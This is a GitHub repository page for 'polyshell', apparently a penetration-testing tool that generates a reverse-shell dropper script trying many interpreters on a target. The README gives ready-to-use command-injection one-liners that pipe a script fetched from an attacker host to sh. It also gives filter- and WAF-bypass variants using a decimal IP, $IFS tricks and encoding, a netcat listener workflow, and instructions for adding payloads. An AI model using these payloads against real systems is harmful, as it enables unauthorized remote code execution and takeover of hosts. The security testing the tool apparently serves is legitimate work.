# https://github.com/Chaelsoo/polyshell

[Skip to content](https://github.com/Chaelsoo/polyshell#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/Chaelsoo/polyshell) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/Chaelsoo/polyshell) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/Chaelsoo/polyshell) to refresh your session.Dismiss alert

{{ message }}

[Chaelsoo](https://github.com/Chaelsoo)/ **[polyshell](https://github.com/Chaelsoo/polyshell)** Public

- [Notifications](https://github.com/login?return_to=%2FChaelsoo%2Fpolyshell) You must be signed in to change notification settings
- [Fork\\
0](https://github.com/login?return_to=%2FChaelsoo%2Fpolyshell)
- [Star\\
1](https://github.com/login?return_to=%2FChaelsoo%2Fpolyshell)


master

[**1** Branch](https://github.com/Chaelsoo/polyshell/branches) [**0** Tags](https://github.com/Chaelsoo/polyshell/tags)

[Go to Branches page](https://github.com/Chaelsoo/polyshell/branches)[Go to Tags page](https://github.com/Chaelsoo/polyshell/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>[![Chaelsoo](https://avatars.githubusercontent.com/u/67665164?v=4&size=40)](https://github.com/Chaelsoo)[Chaelsoo](https://github.com/Chaelsoo/polyshell/commits?author=Chaelsoo)<br>[Add polyshell](https://github.com/Chaelsoo/polyshell/commit/220ffc0087f94a0327ee92fad6e76402f17582bd)<br>last monthJul 7, 2026<br>[220ffc0](https://github.com/Chaelsoo/polyshell/commit/220ffc0087f94a0327ee92fad6e76402f17582bd) · last monthJul 7, 2026<br>## History<br>[1 Commit](https://github.com/Chaelsoo/polyshell/commits/master/) <br>Open commit details<br>[View commit history for this file.](https://github.com/Chaelsoo/polyshell/commits/master/) 1 Commit |
| [.gitignore](https://github.com/Chaelsoo/polyshell/blob/master/.gitignore ".gitignore") | [.gitignore](https://github.com/Chaelsoo/polyshell/blob/master/.gitignore ".gitignore") | [Add polyshell](https://github.com/Chaelsoo/polyshell/commit/220ffc0087f94a0327ee92fad6e76402f17582bd "Add polyshell") | last monthJul 7, 2026 |
| [LICENSE](https://github.com/Chaelsoo/polyshell/blob/master/LICENSE "LICENSE") | [LICENSE](https://github.com/Chaelsoo/polyshell/blob/master/LICENSE "LICENSE") | [Add polyshell](https://github.com/Chaelsoo/polyshell/commit/220ffc0087f94a0327ee92fad6e76402f17582bd "Add polyshell") | last monthJul 7, 2026 |
| [README.md](https://github.com/Chaelsoo/polyshell/blob/master/README.md "README.md") | [README.md](https://github.com/Chaelsoo/polyshell/blob/master/README.md "README.md") | [Add polyshell](https://github.com/Chaelsoo/polyshell/commit/220ffc0087f94a0327ee92fad6e76402f17582bd "Add polyshell") | last monthJul 7, 2026 |
| [payloads.py](https://github.com/Chaelsoo/polyshell/blob/master/payloads.py "payloads.py") | [payloads.py](https://github.com/Chaelsoo/polyshell/blob/master/payloads.py "payloads.py") | [Add polyshell](https://github.com/Chaelsoo/polyshell/commit/220ffc0087f94a0327ee92fad6e76402f17582bd "Add polyshell") | last monthJul 7, 2026 |
| [revgen.py](https://github.com/Chaelsoo/polyshell/blob/master/revgen.py "revgen.py") | [revgen.py](https://github.com/Chaelsoo/polyshell/blob/master/revgen.py "revgen.py") | [Add polyshell](https://github.com/Chaelsoo/polyshell/commit/220ffc0087f94a0327ee92fad6e76402f17582bd "Add polyshell") | last monthJul 7, 2026 |
| View all files |

## Repository files navigation

# polyshell

[Permalink: polyshell](https://github.com/Chaelsoo/polyshell#polyshell)

Polyglot reverse shell dropper generator. Outputs a self-contained `sh` script that walks through available interpreters on the target and connects back on the first one it finds.

```
; $(curl -s http://10.10.14.5/rev|sh)
```

## usage

[Permalink: usage](https://github.com/Chaelsoo/polyshell#usage)

```
# generate dropper to ./rev
python3 revgen.py <LHOST> <LPORT>

# resolve tun0 automatically
python3 revgen.py tun0 4444

# generate and print inject one-liners and server commands
python3 revgen.py tun0 4444 --serve

# list all available payloads
python3 revgen.py tun0 4444 -l

# print a single payload by index
python3 revgen.py tun0 4444 -s 3

# base64 encode a single payload (WAF bypass)
python3 revgen.py tun0 4444 -s 3 -e b64

# url encode a single payload
python3 revgen.py tun0 4444 -s 3 -e url

# custom output filename
python3 revgen.py tun0 4444 -o r
```

## dropper chain

[Permalink: dropper chain](https://github.com/Chaelsoo/polyshell#dropper-chain)

The generated `rev` script tries interpreters in this order, stopping on the first successful connection:

```
python3 > python2 > bash > perl > php > ruby > socat > nc -e > busybox nc > ncat > nc mkfifo > awk
```

Each block uses `if command -v <bin>; then ...; exit; fi` so the session stays alive until you close it.

## inject patterns

[Permalink: inject patterns](https://github.com/Chaelsoo/polyshell#inject-patterns)

```
# standard
; $(curl -s http://10.10.14.5/rev|sh)

# decimal IP (WAF bypass, avoids dotted notation filters)
; $(curl -s http://168431137/rev|sh)

# wget variant
; $(wget -qO- http://10.10.14.5/rev|sh)

# if spaces are filtered
;$(curl$IFS-s$IFS http://10.10.14.5/rev|sh)
```

Convert your IP to decimal:

```
python3 -c "import struct,socket; print(struct.unpack('!I', socket.inet_aton('10.10.14.5'))[0])"
```

## full workflow

[Permalink: full workflow](https://github.com/Chaelsoo/polyshell#full-workflow)

```
# terminal 1, listener
rlwrap nc -lvnp 4444

# terminal 2, generate and serve
python3 revgen.py tun0 4444 --serve
python3 -m http.server 80

# terminal 3, inject (command injection, RCE, SSRF, etc.)
; $(curl -s http://10.10.14.5/rev|sh)
```

## options

[Permalink: options](https://github.com/Chaelsoo/polyshell#options)

```
positional:
  lhost               listener IP or interface (tun0, eth0, ...)
  lport               listener port

optional:
  -o FILE             output filename (default: rev)
  -e {b64,url}        encode output
  -s N                print payload #N only
  -l                  list all payloads
  --serve             print inject one-liners and server/listener commands
  --serve-port PORT   HTTP server port for one-liners (default: 80)
  --no-color          disable colors
```

## extending

[Permalink: extending](https://github.com/Chaelsoo/polyshell#extending)

`payloads.py` is intentionally separate. Add entries to the list returned by `build_payloads()`:

```
("mylang",
 f'mylang -e "connect(\'{h}\',{p})"'),
```

Then add a matching `if command -v` block in `build_dropper()` to include it in the auto-chain.

## notes

[Permalink: notes](https://github.com/Chaelsoo/polyshell#notes)

- Python3 is tried first since it gives a proper pty via `pty.spawn`, skipping the stty upgrade step
- All payloads use double-quotes externally so they survive `curl ... | sh` without quoting conflicts
- `nc -e` failure is detected before falling through to the mkfifo variant, covering both traditional and OpenBSD nc
- `busybox nc` covers Alpine and embedded targets

## About

reverse shell dropper that tries every interpreter on the target

### Resources

[Readme](https://github.com/Chaelsoo/polyshell#readme-ov-file)

[MIT license](https://github.com/Chaelsoo/polyshell#MIT-1-ov-file)

[Activity](https://github.com/Chaelsoo/polyshell/activity)

### Stars

**1** star

### Watchers

**0** watching

### Forks

[**0** forks](https://github.com/Chaelsoo/polyshell/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FChaelsoo%2Fpolyshell&report=Chaelsoo+%28user%29)

## Releases

## Packages

## Contributors

## Languages

You can’t perform that action at this time.